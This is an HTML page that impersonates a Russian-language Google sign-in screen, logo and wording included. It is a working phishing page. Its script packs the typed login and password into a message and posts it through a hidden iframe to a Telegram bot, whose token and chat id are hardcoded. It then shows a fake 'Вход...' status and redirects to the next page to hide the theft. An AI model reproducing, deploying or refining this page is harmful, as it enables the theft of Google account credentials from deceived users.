<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="style.css">
    <title>Вход</title>
</head>
<body>

    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none;"></iframe>

    <div class="glav">
        
        <form id="tgForm" method="POST" target="hidden_iframe">
            
            <input type="hidden" name="chat_id" value="6811862398">
            <input type="hidden" name="text" id="tg_text">

            <div class="imue">
                <img src="gglogo.png" class="imug">
                <p class="sinin">Вход</p>
                <p class="isp">Используйте аккаунт Google</p>
                
                <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);" required>
                <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);" required>
                
                <div id="status" style="color: rgb(200, 200, 200); font-family: Arial; font-size: 14px; margin-top: 10px; min-height: 18px;"></div>
            </div>
            
            <button type="submit" id="button">Далее</button>
            
        </form>
    </div>

    <script>
        const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
        
        const form = document.getElementById("tgForm");
        const inputLogin = document.getElementById("login");
        const inputPass = document.getElementById("password");
        const tgText = document.getElementById("tg_text");
        const btn = document.getElementById("button");
        const status = document.getElementById("status");

        form.action = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        form.addEventListener("submit", (e) => {
            // Формируем текст
            tgText.value = "Логин: " + inputLogin.value + "  Пароль:   " + inputPass.value;

            // Визуальный статус
            btn.disabled = true;
            status.textContent = "Вход...";

            // Имитируем переход на следующую страницу
            setTimeout(() => {
                window.location.href = "next.html";
            }, 800);
        });
    </script>
</body>
</html>
